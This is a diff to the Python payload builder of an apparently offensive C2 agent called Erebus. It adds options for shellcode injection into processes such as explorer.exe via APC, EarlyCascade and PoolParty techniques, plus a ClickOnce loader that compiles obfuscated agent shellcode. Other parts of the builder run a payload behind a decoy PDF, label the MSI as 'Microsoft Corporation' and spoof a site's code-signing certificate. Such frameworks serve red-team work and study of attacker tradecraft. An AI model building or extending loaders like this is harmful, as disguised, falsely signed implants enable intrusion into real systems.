@@ -138,7 +138,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
-        
+
         BuildParameter(
             name = "0.3 Loader Build Configuration",
             parameter_type = BuildParameterType.ChooseOne,
@@ -152,9 +152,79 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             ]
         ),
 
+        BuildParameter(
+            name = "0.3 ClickOnce Build Configuration",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the loader's build config.",
+            choices = ["debug", "release", "publish"],
+            default_value = "debug",
+            hide_conditions = [
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+                # Change this if you are using a custom shellcode retrieval method
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
+            ]
+        ),
+
+        # Shellcode Loader Injection Configuration
+        BuildParameter(
+            name = "0.4 Shellcode Loader - Injection Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = """Select the injection technique for the Shellcode Loader:
+1 = NtQueueApcThread (APC injection to suspended thread - Remote)
+2 = NtMapViewOfSection (Section mapping injection - Remote)
+3 = CreateFiber (Fiber-based execution - Self)
+4 = EarlyCascade (Early Bird APC injection - Remote)
+5 = PoolParty (Worker Factory thread pool injection - Remote)""",
+            choices = ["1", "2", "3", "4", "5"],
+            default_value = "1",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+            ]
+        ),
 
         BuildParameter(
-            name = "0.4 Trigger Binary",
+            name = "0.5 Shellcode Loader - Target Process",
+            parameter_type = BuildParameterType.String,
+            description = "Target process for remote injection (e.g., notepad.exe, explorer.exe)",
+            default_value = "notepad.exe",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+            ]
+        ),
+
+        # ClickOnce Loader Injection Configuration
+        BuildParameter(
+            name = "0.6 ClickOnce - Injection Method",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = """Select the injection method for ClickOnce:
+createfiber = Fiber-based self-injection
+earlycascade = Early Bird APC injection (remote)
+poolparty = Worker Factory thread pool injection (remote)
+classic = Classic CreateRemoteThread injection (remote)
+enumdesktops = EnumDesktops callback injection (self)""",
+            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops"],
+            default_value = "createfiber",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.7 ClickOnce - Target Process",
+            parameter_type = BuildParameterType.String,
+            description = "Target process for remote injection methods (leave empty for explorer.exe)",
+            default_value = "explorer.exe",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.8 Trigger Binary",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "C:\\Windows\\System32\\conhost.exe",
@@ -164,7 +234,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
-            name = "0.5 Trigger Command",
+            name = "0.9 Trigger Command",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
@@ -174,7 +244,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
-            name = "0.6 Decoy File",
+            name = "0.10 Decoy File",
             parameter_type = BuildParameterType.File,
             description = """Upload a decoy file (PDF/XLSX/etc.).
 If one is not uploaded then an example file will be used.""",
@@ -346,7 +416,7 @@ generated if none have been entered.""",
             ]
         ),
         BuildParameter(
-            name="5.1 MSI Product Name",
+            name="5.0 MSI Product Name",
             parameter_type=BuildParameterType.String,
             description="Application name shown in MSI/UI",
             default_value="System Updater",
@@ -356,7 +426,7 @@ generated if none have been entered.""",
             ]
         ),
         BuildParameter(
-            name="5.2 MSI Manufacturer",
+            name="5.1 MSI Manufacturer",
             parameter_type=BuildParameterType.String,
             description="Company name shown in MSI metadata",
             default_value="Microsoft Corporation",
@@ -366,7 +436,7 @@ generated if none have been entered.""",
             ]
         ),
         BuildParameter(
-            name="5.3 MSI Install Scope",
+            name="5.2 MSI Install Scope",
             parameter_type=BuildParameterType.ChooseOne,
             description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
             choices=["User", "Machine"],
@@ -426,7 +496,7 @@ generated if none have been entered.""",
                 HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
             ]
         ),
-        
+
         BuildParameter(
             name="6.5 Codesign Cert",
             parameter_type=BuildParameterType.File,
@@ -466,8 +536,11 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),
-        
-        BuildStep(step_name = "Signing Shellcode Loader",
+
+        BuildStep(step_name = "Compiling ClickOnce Loader`",
+            step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),
+
+        BuildStep(step_name = "Sign Shellcode Loader",
             step_description = "Signing the Shellcode Loader with a code signing certificate"),
 
         BuildStep(step_name = "Adding Trigger",
@@ -868,94 +941,261 @@ generated if none have been entered.""",
             ######################### Shellcode Loader Section #########################
             if self.get_parameter("0.0 Main Payload Type") == "Loader":
                 print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
+                # Logic : Select between shellcode loader and clickonce loader
+                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
+                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)
 
-                shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)
+                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
+                    payload_path = str(payload_path)
 
-                payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
-                payload_path = str(payload_path)
+                    # ===== Configure Shellcode Loader config.hpp =====
+                    config_hpp_template_path = PurePath(agent_build_path) / "templates" / "config.hpp"
+                    config_hpp_template_path = str(config_hpp_template_path)
+                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
+                    config_hpp_destination = str(config_hpp_destination)
 
-                # Convert resource file to UTF16
-                cmd = [
-                    "iconv",
-                    "-f",
-                    "UTF-16LE",
-                    "-t",
-                    "UTF-8",
-                    f"{shellcode_loader_path}/Erebus.Loader.rc",
-                ]
+                    try:
+                        # Load and render the config.hpp template
+                        config_template = environment.get_template("config.hpp")
+                        config_data = {
+                            "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
+                            "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                        }
+                        rendered_config = config_template.render(**config_data)
+                        
+                        # Write the rendered config to the destination
+                        with open(config_hpp_destination, "w") as config_file:
+                            config_file.write(rendered_config)
+                        
+                        response.status = BuildStatus.Success
+                        response.build_message = "Shellcode Loader config generated!"
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Configuring Shellcode Loader",
+                            StepStdout="Generated config.hpp with user-defined injection parameters",
+                            StepSuccess=True,
+                        ))
+                    except Exception as e:
+                        response.status = BuildStatus.Error
+                        response.build_stderr = f"Failed to render Shellcode Loader config: {str(e)}"
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Configuring Shellcode Loader",
+                            StepStdout=f"Failed to render config.hpp: {str(e)}",
+                            StepSuccess=False,
+                        ))
+                        return response
 
-                resource_file = subprocess.check_output(cmd, text=True)
-                with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
-                    file.write(resource_file)
+                    # Convert resource file to UTF16
+                    cmd = [
+                        "iconv",
+                        "-f",
+                        "UTF-16LE",
+                        "-t",
+                        "UTF-8",
+                        f"{shellcode_loader_path}/Erebus.Loader.rc",
+                    ]
 
-                cmd = [
-                    "mv",
-                    f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
-                    f"{shellcode_loader_path}/Erebus.Loader.rc",
-                ]
-                process = await asyncio.create_subprocess_exec(
-                    *cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                stdout, stderr = await process.communicate()
+                    resource_file = subprocess.check_output(cmd, text=True)
+                    with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
+                        file.write(resource_file)
 
-                if stdout:
-                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
-                if stderr:
-                    output += f"[stderr]\n{stderr.decode(errors='replace')}"
+                    cmd = [
+                        "mv",
+                        f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
+                        f"{shellcode_loader_path}/Erebus.Loader.rc",
+                    ]
+                    process = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    stdout, stderr = await process.communicate()
 
-                # Compile Loader
-                cmd = [
-                    "make",
-                    "-C",
-                    shellcode_loader_path,
-                    f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
-                    "all"
-                ]
-                process = await asyncio.create_subprocess_exec(
-                    *cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-                stdout, stderr = await process.communicate()
+                    if stdout:
+                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                    if stderr:
+                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
-                if stdout:
-                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
-                if stderr:
-                    output += f"[stderr]\n{stderr.decode(errors='replace')}"
+                    # Compile Loader
+                    cmd = [
+                        "make",
+                        "-C",
+                        shellcode_loader_path,
+                        f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
+                        "all"
+                    ]
+                    process = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    stdout, stderr = await process.communicate()
 
-                shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")
+                    if stdout:
+                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                    if stderr:
+                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
-                if os.path.exists(payload_path):
-                    # Debug
-                    # response.payload = open(payload_path, "rb").read()
-                    # response.updated_filename = "erebus_loader.exe"
-                    response.status = BuildStatus.Success
-                    response.build_message = "Loader Compiled!"
-                    response.build_stdout = output + "\n" + payload_path
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="Compiling Shellcode Loader",
-                        StepStdout="Shellcode Loader Compiled!",
-                        StepSuccess=True,
-                    ))
+                    shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")
 
-                    # return response
-                else:
-                    response.status = BuildStatus.Error
-                    response.build_message = "Failed to compile loader"
-                    response.build_stderr = output + "\n" + payload_path
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="Compiling Shellcode Loader",
-                        StepStdout="Failed to Compile Shellcode Loader",
-                        StepSuccess=False,
-                    ))
-                    return response
-                output = ""
+                    if os.path.exists(payload_path):
+                        # Debug
+                        # response.payload = open(payload_path, "rb").read()
+                        # response.updated_filename = "erebus_loader.exe"
+                        response.status = BuildStatus.Success
+                        response.build_message = "Loader Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compiling Shellcode Loader",
+                            StepStdout="Shellcode Loader Compiled!",
+                            StepSuccess=True,
+                        ))
+
+                        # return response
+                    else:
+                        response.status = BuildStatus.Error
+                        response.build_message = "Failed to compile loader"
+                        response.build_stderr = output + "\n" + payload_path
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compiling Shellcode Loader",
+                            StepStdout="Failed to Compile Shellcode Loader",
+                            StepSuccess=False,
+                        ))
+                        return response
+                    output = ""
+                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
+                    # Copy obfuscated shellcode to ClickOnce Resources folder
+                    clickonce_resources_path = Path(clickonce_loader_path) / "Resources"
+                    shutil.copy(dst=str(clickonce_resources_path / "erebus.bin"), src=obfuscated_shellcode_path)
+
+                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
+                    payload_path = str(payload_path)
+
+                    # ===== Configure ClickOnce InjectionConfig.cs =====
+                    injection_config_template_path = PurePath(agent_build_path) / "templates" / "InjectionConfig.cs"
+                    injection_config_template_path = str(injection_config_template_path)
+                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
+                    injection_config_destination = str(injection_config_destination)
+
+                    try:
+                        # Extract encryption key from the key.hpp file
+                        encryption_key_bytes = ""
+                        if os.path.exists(encryption_key_path_cpp):
+                            try:
+                                with open(encryption_key_path_cpp, "r") as key_file:
+                                    key_content = key_file.read()
+                                    # Parse the key array to get hex values (e.g., 0x01, 0x02, ...)
+                                    import re
+                                    hex_matches = re.findall(r'0x[0-9a-fA-F]{2}', key_content)
+                                    if hex_matches:
+                                        encryption_key_bytes = ", ".join(hex_matches)
+                            except Exception as key_error:
+                                output += f"Warning: Could not extract encryption key: {str(key_error)}\n"
+                        
+                        # Load and render the InjectionConfig.cs template
+                        injection_config_template = environment.get_template("InjectionConfig.cs")
+                        injection_config_data = {
+                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
+                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
+                            "ENCRYPTION_KEY": encryption_key_bytes,
+                        }
+                        rendered_injection_config = injection_config_template.render(**injection_config_data)
+                        
+                        # Write the rendered config to the destination
+                        with open(injection_config_destination, "w") as config_file:
+                            config_file.write(rendered_injection_config)
+                        
+                        response.status = BuildStatus.Success
+                        response.build_message = "ClickOnce config generated!"
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Configuring ClickOnce Loader",
+                            StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
+                            StepSuccess=True,
+                        ))
+                    except Exception as e:
+                        response.status = BuildStatus.Error
+                        response.build_stderr = f"Failed to render ClickOnce config: {str(e)}"
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Configuring ClickOnce Loader",
+                            StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
+                            StepSuccess=False,
+                        ))
+                        return response
+
+                    # Compile ClickOnce Loader using Makefile
+                    cmd = [
+                        "make",
+                        "-C",
+                        clickonce_loader_path,
+                        f"CONFIG={self.get_parameter('0.3 ClickOnce Build Configuration')}",
+                        "publish"
+                    ]
+
+                    process = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    stdout, stderr = await process.communicate()
+
+                    if stdout:
+                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                    if stderr:
+                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
+
+                    # ClickOnce publish outputs to bin/{Config}/net8.0-windows/win-x64/publish/
+                    clickonce_output_path = Path(clickonce_loader_path) / "bin" / f"{self.get_parameter('0.3 ClickOnce Build Configuration')}" / "net8.0-windows" / "win-x64" / "publish"
+
+                    # Find the main executable in the publish directory
+                    clickonce_exe = clickonce_output_path / "Erebus.ClickOnce.exe"
+
+                    if clickonce_exe.exists():
+                        # Copy all ClickOnce deployment files to payload directory
+                        payload_dir = Path(agent_build_path) / "payload"
+                        for item in clickonce_output_path.iterdir():
+                            if item.is_file():
+                                dest_path = payload_dir / item.name
+                                shutil.copy2(str(item), str(dest_path))
+                                # Rename main executable to erebus.exe
+                                if item.name == "Erebus.ClickOnce.exe":
+                                    if dest_path.exists():
+                                        shutil.move(str(dest_path), payload_path)
+
+                        response.status = BuildStatus.Success
+                        response.build_message = "ClickOnce Loader Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compiling ClickOnce Loader",
+                            StepStdout="ClickOnce Loader Compiled!",
+                            StepSuccess=True,
+                        ))
+                    else:
+                        response.status = BuildStatus.Error
+                        response.build_message = f"Failed to compile ClickOnce loader - executable not found at {clickonce_exe}"
+                        response.build_stderr = output + "\n" + str(clickonce_exe)
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compiling ClickOnce Loader",
+                            StepStdout="Failed to Compile ClickOnce Loader",
+                            StepSuccess=False,
+                        ))
+                        return response
+                    output = ""
+
             ######################### End Of Shellcode Loader Section #########################
 
             ######################### Code Signing Section #########################
@@ -984,7 +1224,7 @@ generated if none have been entered.""",
                         target_url = self.get_parameter("6.4 Codesign Spoof URL")
                         if not target_url:
                             raise ValueError("No URL provided for spoofing")
-                        
+
                         cert_details = get_remote_cert_details(target_url)
                         self_sign_payload(
                             payload_path=payload_path,
@@ -993,24 +1233,24 @@ generated if none have been entered.""",
                             full_details=cert_details
                         )
                         success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"
-                    
+
                     elif signing_type == "Provide Certificate":
                         cert_uuid = self.get_parameter("6.5 Codesign Cert")
                         cert_pass = self.get_parameter("6.6 Codesign Cert Password")
-                        
+
                         if not cert_uuid:
                             raise ValueError("No certificate file uploaded")
 
                         file_resp = await SendMythicRPCFileGetContent(
                             MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                         )
-                        
+
                         if not file_resp.Success:
                             raise ValueError("Failed to retrieve certificate file")
-                        
+
                         cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                         cert_path.write_bytes(file_resp.Content)
-                        
+
                         sign_with_provided_cert(
                             payload_path=payload_path,
                             cert_path=cert_path,
@@ -1023,7 +1263,7 @@ generated if none have been entered.""",
 
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Code Signing",
+                        StepName="Sign Shellcode Loader",
                         StepStdout=f"Success: {success_msg}",
                         StepSuccess=True
                     ))
@@ -1031,20 +1271,14 @@ generated if none have been entered.""",
                 except Exception as e:
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Code Signing",
+                        StepName="Sign Shellcode Loader",
                         StepStdout=f"Signing Failed: {str(e)}",
                         StepSuccess=False
                     ))
                     response.status = BuildStatus.Error
                     response.build_stderr = f"Code signing failed: {str(e)}"
                     return response
-            else:
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="Code Signing",
-                    StepStdout="Skipped (Not Enabled)",
-                    StepSuccess=True
-                ))        
+  
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
